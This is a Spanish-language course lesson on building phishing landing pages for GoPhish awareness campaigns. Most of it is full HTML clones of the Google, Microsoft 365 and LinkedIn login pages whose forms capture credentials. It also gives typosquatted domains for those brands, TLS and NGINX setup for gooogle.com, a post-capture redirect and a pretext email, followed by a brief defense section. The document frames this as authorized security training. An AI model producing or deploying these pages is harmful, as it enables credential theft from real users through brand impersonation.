# 🌐 Landing Pages de Phishing

> *Las landing pages de phishing son páginas web falsas diseñadas para capturar credenciales. Este documento cubre templates, diseño y configuración de landing pages para campañas de concientización.*

---

## 📋 Tabla de contenido

1. [Qué son las landing pages](#1-qué-son-las-landing-pages)
2. [Principios de diseño](#2-principios-de-diseño)
3. [Templates predefinidos](#3-templates-predefinidos)
4. [Personalización](#4-personalización)
5. [Configuración técnica](#5-configuración-técnica)
6. [Ejemplos completos](#6-ejemplos-completos)
7. [Defensa y remediación](#7-defensa-y-remediación)
8. [Referencias](#8-referencias)

---

## 1. Qué son las landing pages

Las landing pages de phishing son páginas web falsas que:
- **Clonan sitios legítimos** (Google, Microsoft, LinkedIn)
- **Capturan credenciales** cuando el usuario hace login
- **Redirigen** al usuario al sitio real después del login
- **Registran** todos los datos enviados

### Componentes de una landing page

| Componente | Descripción |
|---|---|
| **Formulario** | Captura usuario y contraseña |
| **Diseño** | Idéntico al sitio real |
| **URL** | Dominio similar al real |
| **SSL** | Certificado para parecer legítimo |
| **Redirección** | Envía al sitio real después del login |

---

## 2. Principios de diseño

### Reglas de oro

```markdown
1. COPIAR el diseño exacto del sitio original
2. MANTENER la misma estructura y colores
3. USAR el mismo logotipo y fuentes
4. INCLUIR los mismos elementos de UI
5. REDUCIR errores ortográficos
6. HACER que la URL parezca legítima
```

### Checklist de una landing page

- [ ] **Diseño idéntico** al sitio original
- [ ] **Logotipo correcto** y tamaño adecuado
- [ ] **Fuentes y colores** idénticos
- [ ] **Formulario funcional** que capture credenciales
- [ ] **Redirección** al sitio real después del login
- [ ] **Certificado SSL** válido
- [ ] **URL similar** al dominio real
- [ ] **Responsive** (funciona en móvil)

---

## 3. Templates predefinidos

### Template 1: Google Login

```html
<!DOCTYPE html>
<html>
<head>
  <title>Iniciar sesión - Cuentas de Google</title>
  <style>
    body {
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      background-color: #f1f3f4;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      padding: 48px 40px 36px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.12);
      width: 100%;
      max-width: 450px;
      text-align: center;
    }
    .logo {
      margin-bottom: 16px;
    }
    .logo img {
      height: 24px;
    }
    h1 {
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      margin-bottom: 4px;
    }
    .subtitle {
      font-size: 16px;
      color: #5f6368;
      margin-bottom: 32px;
    }
    .form-group {
      text-align: left;
      margin-bottom: 16px;
    }
    label {
      display: block;
      font-size: 12px;
      color: #5f6368;
      margin-bottom: 8px;
    }
    input {
      width: 100%;
      padding: 13px 15px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    input:focus {
      border-color: #1a73e8;
      outline: none;
    }
    .forgot-link {
      display: block;
      text-align: left;
      margin-top: 8px;
      margin-bottom: 32px;
    }
    .forgot-link a {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
    }
    .buttons {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .create-account {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
    }
    .next-button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 10px 24px;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }
    .next-button:hover {
      background-color: #1765cc;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
           alt="Google">
    </div>
    
    <h1>Iniciar sesión</h1>
    <p class="subtitle">Usa tu cuenta de Google</p>
    
    <form action="{{.URL}}" method="POST">
      <div class="form-group">
        <input type="email" id="email" name="email" required 
               placeholder="Correo electrónico o teléfono">
      </div>
      
      <div class="form-group">
        <input type="password" id="password" name="password" required
               placeholder="Ingresa tu contraseña">
      </div>
      
      <a href="#" class="forgot-link">
        <a href="https://accounts.google.com/signin/recovery" 
           style="color: #1a73e8; text-decoration: none; font-size: 14px;">
          ¿Olvidaste tu contraseña?
        </a>
      </a>
      
      <div class="buttons">
        <a href="#" class="create-account">Crear cuenta</a>
        <button type="submit" class="next-button">Siguiente</button>
      </div>
    </form>
  </div>
</body>
</html>
```

### Template 2: Microsoft 365 Login

```html
<!DOCTYPE html>
<html>
<head>
  <title>Iniciar sesión en Microsoft 365</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      padding: 44px;
      border-radius: 4px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 440px;
    }
    .logo {
      text-align: center;
      margin-bottom: 16px;
    }
    h1 {
      font-size: 24px;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 8px;
      text-align: center;
    }
    .subtitle {
      font-size: 15px;
      color: #616161;
      margin-bottom: 24px;
      text-align: center;
    }
    .form-group {
      margin-bottom: 16px;
    }
    input {
      width: 100%;
      padding: 6px 10px;
      border: 1px solid #666;
      border-bottom: 2px solid #0067b8;
      font-size: 15px;
      box-sizing: border-box;
    }
    input:focus {
      border-bottom-color: #0067b8;
      outline: none;
    }
    .forgot-link {
      display: block;
      margin-top: 8px;
      margin-bottom: 20px;
    }
    .forgot-link a {
      color: #0067b8;
      text-decoration: none;
      font-size: 13px;
    }
    .no-account {
      display: block;
      margin-bottom: 16px;
    }
    .no-account a {
      color: #0067b8;
      text-decoration: none;
      font-size: 13px;
    }
    .next-button {
      width: 100%;
      background-color: #0067b8;
      color: white;
      border: none;
      padding: 10px;
      font-size: 15px;
      cursor: pointer;
    }
    .next-button:hover {
      background-color: #005a9e;
    }
    .footer {
      margin-top: 16px;
      text-align: center;
    }
    .footer a {
      color: #616161;
      text-decoration: none;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/amis/2m7K39?ver=66c6&q=90&m=6&h=7a5e5d&s=607&w=1424&f=jpg&o=f&p=140" 
           alt="Microsoft" height="24">
    </div>
    
    <h1>Iniciar sesión</h1>
    <p class="subtitle">Usar una cuenta de la empresa, la escuela u otra organización</p>
    
    <form action="{{.URL}}" method="POST">
      <div class="form-group">
        <input type="email" id="email" name="email" required 
               placeholder="usuario@empresa.com">
      </div>
      
      <a href="#" class="forgot-link">
        <a href="https://account.live.com/password/reset" 
           style="color: #0067b8; text-decoration: none;">
          ¿Olvidaste la contraseña?
        </a>
      </a>
      
      <a href="#" class="no-account">
        <a href="https://signup.live.com" 
           style="color: #0067b8; text-decoration: none;">
          ¿No tiene una cuenta?
        </a>
      </a>
      
      <button type="submit" class="next-button">Siguiente</button>
    </form>
    
    <div class="footer">
      <a href="https://www.microsoft.com/es-es/microsoft-365/business/compare-all-plans">
        Opciones de sesión
      </a>
    </div>
  </div>
</body>
</html>
```

### Template 3: LinkedIn Login

```html
<!DOCTYPE html>
<html>
<head>
  <title>LinkedIn Login, Sign in | LinkedIn</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #f3f2ef;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      padding: 24px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 350px;
    }
    .logo {
      text-align: center;
      margin-bottom: 16px;
    }
    h1 {
      font-size: 32px;
      font-weight: 600;
      color: #000000e6;
      margin-bottom: 8px;
    }
    .form-group {
      margin-bottom: 16px;
    }
    label {
      display: block;
      font-size: 14px;
      color: #00000099;
      margin-bottom: 4px;
    }
    input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #00000066;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    input:focus {
      border-color: #0a66c2;
      outline: none;
    }
    .forgot-link {
      display: block;
      margin-top: 8px;
      margin-bottom: 20px;
    }
    .forgot-link a {
      color: #0a66c2;
      text-decoration: none;
      font-size: 14px;
    }
    .signin-button {
      width: 100%;
      background-color: #0a66c2;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 24px;
      font-size: 16px;
      cursor: pointer;
    }
    .signin-button:hover {
      background-color: #004182;
    }
    .divider {
      text-align: center;
      margin: 16px 0;
      color: #00000066;
    }
    .google-button {
      width: 100%;
      background-color: white;
      color: #00000099;
      border: 1px solid #00000066;
      padding: 12px;
      border-radius: 24px;
      font-size: 14px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .join-link {
      text-align: center;
      margin-top: 20px;
    }
    .join-link a {
      color: #000000e6;
      text-decoration: none;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <img src="https://content.linkedin.com/content/dam/me/business/en/brand/ps-cta/brand-logo/lockup/logo-on-white.png" 
           alt="LinkedIn" height="34">
    </div>
    
    <form action="{{.URL}}" method="POST">
      <div class="form-group">
        <label for="email">Correo electrónico o teléfono</label>
        <input type="text" id="email" name="email" required>
      </div>
      
      <div class="form-group">
        <label for="password">Contraseña</label>
        <input type="password" id="password" name="password" required>
      </div>
      
      <a href="#" class="forgot-link">
        <a href="https://www.linkedin.com/uas/password-reset" 
           style="color: #0a66c2; text-decoration: none;">
          ¿Olvidaste tu contraseña?
        </a>
      </a>
      
      <button type="submit" class="signin-button">Iniciar sesión</button>
    </form>
    
    <div class="divider">o</div>
    
    <button class="google-button">
      <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" 
           width="18" height="18">
      Iniciar sesión con Google
    </button>
    
    <div class="join-link">
      <a href="https://www.linkedin.com/join">¿Eres nuevo en LinkedIn? Únete ahora</a>
    </div>
  </div>
</body>
</html>
```

---

## 4. Personalización

### Variables en GoPhish

| Variable | Descripción |
|---|---|
| `{{.URL}}` | URL de rastreo única por destinatario |
| `{{.RId}}` | ID de rastreo único |
| `{{.FirstName}}` | Nombre del destinatario |
| `{{.LastName}}` | Apellido del destinatario |
| `{{.Email}}` | Email del destinatario |
| `{{.Position}}` | Cargo del destinatario |

### Ejemplo de personalización

```html
<!-- Personalizar con datos del destinatario -->
<form action="{{.URL}}" method="POST">
  <div class="form-group">
    <input type="email" id="email" name="email" required 
           placeholder="{{.Email}}" value="{{.Email}}">
  </div>
  
  <div class="form-group">
    <input type="password" id="password" name="password" required
           placeholder="Ingresa tu contraseña">
  </div>
  
  <button type="submit">Iniciar sesión</button>
</form>
```

---

## 5. Configuración técnica

### Dominio similar (typosquatting)

```markdown
# Ejemplos de dominios similares
google.com → gooogle.com, g00gle.com
microsoft.com → rnicrosoft.com, micros0ft.com
linkedin.com → linkedln.com, linkedln.com

# Registrar dominios
# Usar registradores como Namecheap, GoDaddy
```

### Certificado SSL

```bash
# Con Let's Encrypt (gratuito)
certbot certonly --webroot -w /var/www/html -d gooogle.com

# Con NGINX
server {
    listen 443 ssl;
    server_name gooogle.com;
    
    ssl_certificate /etc/letsencrypt/live/gooogle.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/gooogle.com/privkey.pem;
    
    root /var/www/phishing;
    index index.html;
}
```

### Redirector

```bash
# Redirigir al sitio real después del login
# En GoPhish: Landing Page → Redirect to

# O con NGINX
location / {
    if ($request_method = POST) {
        # Capturar credenciales
        # Redirigir al sitio real
        return 302 https://accounts.google.com;
    }
}
```

---

## 6. Ejemplos completos

### Ejemplo: Campaña de concientización

```markdown
## Campaña: Phishing de Microsoft 365

### Objetivo
- Evaluar la tasa de clics en emails de phishing
- Medir la efectividad del entrenamiento

### Landing page
- Template: Microsoft 365 Login
- URL: https://login-empresa.com (dominio typosquatting)
- SSL: Let's Encrypt

### Email template
"Asunto: Actualización de contraseña requerida

Estimado empleado,

Por motivos de seguridad, es necesario que actualices 
tu contraseña antes del viernes.

[Actualizar Contraseña]

Atentamente,
Departamento de TI"

### Resultados
- Emails enviados: 100
- Clics: 35 (35%)
- Credenciales: 20 (20%)
- Reportes: 15 (15%)
```

---

## 7. Defensa y remediación

### Para Blue Team / Equipo de Seguridad

| Vector | Detección | Mitigación |
|---|---|---|
| **Dominios typosquatting** | Monitorear registros DNS | Registrar dominios similares |
| **Certificados SSL falsos** | Verificar certificados | Usar certificate pinning |
| **Landing pages** | Analizar URLs | MFA, password managers |
| **Phishing emails** | Filtros de spam | Entrenamiento, reporte |

### Monitoreo activo

```bash
# Monitorear registros DNS
dig +short gooogle.com

# Verificar certificados
openssl s_client -connect gooogle.com:443 -servername gooogle.com

# Usar herramientas de monitoreo
# PhishTank, URLScan.io, VirusTotal
```

### Entrenamiento continuo

| Actividad | Frecuencia | Responsable |
|---|---|---|
| Campañas de phishing | Mensual | Equipo de Seguridad |
| Análisis de resultados | Post-campaña | Management |
| Entrenamiento interactivo | Trimestral | RRHH + Seguridad |

---

## 8. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **GoPhish** | [https://getgophish.com](https://getgophish.com) |
| **MITRE ATT&CK — Phishing** | [https://attack.mitre.org/techniques/T1566/](https://attack.mitre.org/techniques/T1566/) |
| **PhishTank** | [https://www.phishtank.com](https://www.phishtank.com) |
| **URLScan.io** | [https://urlscan.io](https://urlscan.io) |

### Frameworks de referencia

| Framework | Uso |
|---|---|
| **MITRE ATT&CK** | Tácticas y técnicas de adversarios |
| **NIST CSF** | Marco de seguridad |
| **ISO 27001** | Gestión de seguridad |

---

## 📝 Entregable de portafolio

```markdown
# Landing Page de Phishing — [Nombre de la empresa]

## Contexto
- Objetivo: Evaluar detección de phishing
- Herramienta: GoPhish
- Landing: Microsoft 365 Login

## Diseño
- Template: Microsoft 365
- URL: https://login-empresa.com
- SSL: Let's Encrypt

## Resultados
- Emails enviados: 100
- Clics: 35 (35%)
- Credenciales: 20 (20%)

## Análisis
- El 35% de los usuarios hizo clic
- El 20% entregó credenciales
- Solo el 15% reportó el intento

## Recomendaciones
1. Implementar MFA en Microsoft 365
2. Entrenamiento en detección de phishing
3. Bloquear dominios similares
4. Crear proceso de reporte

## Evidencia
- Landing page: [enlace]
- Dashboard de GoPhish: [enlace]
- Reporte: [enlace]
```

---

**[⬅ Vishing](../pretexting/03-vishing.md)** · **[⬅ Volver al módulo](../README.md)** · **[→ Configurar campaña](./02-configuracion-gophish.md)**
